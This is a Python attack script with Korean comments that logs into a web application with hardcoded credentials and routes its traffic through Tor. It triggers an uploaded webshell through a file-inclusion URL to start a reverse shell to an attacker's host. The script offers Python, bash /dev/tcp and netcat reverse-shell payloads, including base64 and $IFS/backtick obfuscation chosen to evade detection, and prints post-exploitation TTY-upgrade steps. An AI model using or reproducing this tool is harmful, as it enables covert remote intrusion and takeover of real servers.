#!/usr/bin/env python3
"""
초스텔스 모드
- 단 1번의 요청만
- 완벽한 페이로드
- 탐지 완전 회피
"""

import requests
import sys
import time
import base64
import urllib.parse

def ultra_stealth_attack(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print("초스텔스 공격 - 단 1번의 완벽한 시도")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}\n")

    # alice 로그인
    print("[1] alice 로그인...")
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)

    if 'login.php' in resp.url:
        print("[-] 로그인 실패")
        return

    print("[+] alice 세션 획득\n")

    # 사용자 선택
    print("[2] 공격 벡터 선택:")
    print("="*60)

    print("\n웹쉘 선택:")
    webshells = [
        "shell_4727.php",
        "photo.php.jpg",
        "avatar_4727.jpg",
        "capture_4133.png",
    ]

    for i, shell in enumerate(webshells, 1):
        print(f"{i}. {shell}")

    shell_choice = input("\n선택 (1-4, 기본: 1): ").strip() or "1"
    selected_shell = webshells[int(shell_choice) - 1]

    print(f"\n파라미터 선택 (탐지 회피):")
    params = [
        ("c", "낮은 탐지"),
        ("x", "낮은 탐지"),
        ("e", "낮은 탐지"),
        ("cmd", "높은 탐지 (원래 작동했던 것)"),
    ]

    for i, (param, desc) in enumerate(params, 1):
        print(f"{i}. {param:10s} - {desc}")

    param_choice = input("\n선택 (1-4, 기본: 2): ").strip() or "2"
    selected_param = params[int(param_choice) - 1][0]

    print(f"\n페이로드 선택:")

    # 리버스 쉘 기본
    rs_python = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    rs_bash = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    rs_nc = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f"

    # Base64 인코딩
    b64_bash = base64.b64encode(rs_bash.encode()).decode()

    payloads = [
        ("Python 리버스 쉘", rs_python),
        ("Bash 리버스 쉘", rs_bash),
        ("Netcat 리버스 쉘", rs_nc),
        ("Base64 인코딩 Bash", f"echo {b64_bash}|base64 -d|bash"),
        ("환경변수 우회", f"bash$IFS-i$IFS>&$IFS/dev/tcp/{attacker_ip}/{attacker_port}$IFS0>&1"),
        ("백틱 난독화", f"b`a`s`h` -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"),
    ]

    for i, (name, _) in enumerate(payloads, 1):
        print(f"{i}. {name}")

    payload_choice = input("\n선택 (1-6, 기본: 1): ").strip() or "1"
    selected_payload = payloads[int(payload_choice) - 1][1]

    # 백그라운드 실행
    bg_choice = input("\n백그라운드 실행 추가 (&)? (y/n, 기본: y): ").strip().lower() or "y"

    if bg_choice == 'y':
        final_payload = selected_payload + " &"
    else:
        final_payload = selected_payload

    # 최종 확인
    print(f"\n{'='*60}")
    print("최종 공격 정보:")
    print(f"{'='*60}")
    print(f"웹쉘: {selected_shell}")
    print(f"파라미터: {selected_param}")
    print(f"페이로드: {payloads[int(payload_choice) - 1][0]}")
    print(f"백그라운드: {'예' if bg_choice == 'y' else '아니오'}")

    final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&{selected_param}={urllib.parse.quote(final_payload)}"

    print(f"\n최종 URL:")
    print(f"{final_url[:120]}...")

    print(f"\n{'='*60}")
    print("[!] 경고: 이것은 단 1번의 시도입니다!")
    print("[!] C2 리스너가 준비되었는지 확인하세요:")
    print(f"    nc -lvnp {attacker_port}")
    print(f"{'='*60}\n")

    confirm = input("실행하시겠습니까? (yes 입력): ").strip()

    if confirm.lower() != 'yes':
        print("\n[-] 취소됨")
        return

    print(f"\n[*] 공격 실행 중...")
    print(f"[*] 요청 전송...")

    try:
        start_time = time.time()
        resp = session.get(final_url, timeout=15)
        elapsed = time.time() - start_time

        print(f"\n[+] 응답 수신:")
        print(f"    Status: {resp.status_code}")
        print(f"    시간: {elapsed:.2f}초")
        print(f"    크기: {len(resp.text)} bytes")

        if resp.status_code == 200:
            print(f"\n[+] ✅ 200 OK")

            if len(resp.text.strip()) > 0:
                print(f"\n[*] 응답 내용:")
                print(f"{resp.text[:500]}")
        else:
            print(f"\n[?] Status {resp.status_code}")

    except requests.exceptions.Timeout:
        print(f"\n[+] ✅ 타임아웃!")
        print(f"[*] 백그라운드 실행되었을 가능성 높음")
        print(f"[*] C2 리스너 확인하세요!")

    except requests.exceptions.ConnectionError as e:
        print(f"\n[+] ✅ 연결 오류!")
        print(f"[*] 프록시/서버 이슈 또는 성공 가능성")

    except Exception as e:
        print(f"\n[-] 오류: {str(e)}")

    print(f"\n{'='*60}")
    print("[*] 공격 완료")
    print(f"{'='*60}")
    print(f"\n[!] 다음 확인사항:")
    print(f"    1. C2 리스너에 연결이 있는지 확인")
    print(f"    2. 없다면 1-2분 기다려보기")
    print(f"    3. 그래도 안되면 다른 조합으로 재시도")
    print(f"\n[*] 연결 성공 시 TTY 업그레이드:")
    print(f"    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print(f"    export TERM=xterm")
    print(f"    Ctrl+Z")
    print(f"    stty raw -echo; fg")
    print(f"    reset")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 105_ultra_stealth.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 105_ultra_stealth.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    ultra_stealth_attack(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
